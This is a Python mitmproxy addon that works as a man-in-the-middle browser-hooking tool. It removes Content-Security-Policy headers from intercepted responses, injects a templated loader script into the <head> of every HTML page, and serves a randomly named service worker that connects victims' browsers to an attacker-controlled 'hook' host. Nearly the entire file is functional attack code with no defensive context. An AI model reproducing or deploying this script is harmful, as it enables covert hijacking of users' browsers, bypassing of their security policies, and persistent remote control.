from mitmproxy import http
from os import path, environ
from jinja2 import Template
from jsmin import jsmin

hook_host = environ.get("HOOK_HOST", "localhost")
hook_port_http = environ.get("HOOK_PORT_HTTP", 8081)
hook_port_https = environ.get("HOOK_PORT_HTTPS", 8445)

injection_anchor = "<head>"

sw_name = "fsef5fe9q3v6w4e8rtyt96sd4wq832qf8"
sw_path = "/%s.js" % sw_name

cur_dir = path.dirname(path.realpath(__file__))

with open(path.join(cur_dir, "hook_sw.js")) as f:
    hook_sw_template = Template(f.read())
    hook_sw = hook_sw_template.render(
        hook_host=hook_host,
        hook_port_https=hook_port_https
    )
    hook_sw = jsmin(hook_sw)

with open(path.join(cur_dir, "loader.html")) as f:
    injection_template = Template(f.read())
    injection = injection_template.render(
        hook_host=hook_host,
        hook_port_http=hook_port_http,
        hook_port_https=hook_port_https,
        sw_name=sw_name
    )
    injection = jsmin(injection)

def request(flow):
    if flow.request.path == sw_path:
        flow.response = http.HTTPResponse.make(
            200,
            hook_sw,
            {"Content-Type": "application/javascript"}
        )
        
def response(flow):
    response = flow.response
    disable_csp_headers(response)
    inject(response)

def disable_csp_headers(response):
    response.headers.pop("content-security-policy", None)
    response.headers.pop("content-security-policy-report-only", None)

def inject(response):
    if response.status_code != 200:
        return
    content_type = response.headers.get("content-type", None)
    if not content_type or 'text/html' not in content_type:
        return

    content = response.get_text()

    anchor_pos = content.find(injection_anchor)
    if anchor_pos == -1:
        return
    anchor_pos += len(injection_anchor)
    new_content = content[:anchor_pos] + injection + content[anchor_pos:]
    response.text = new_content
    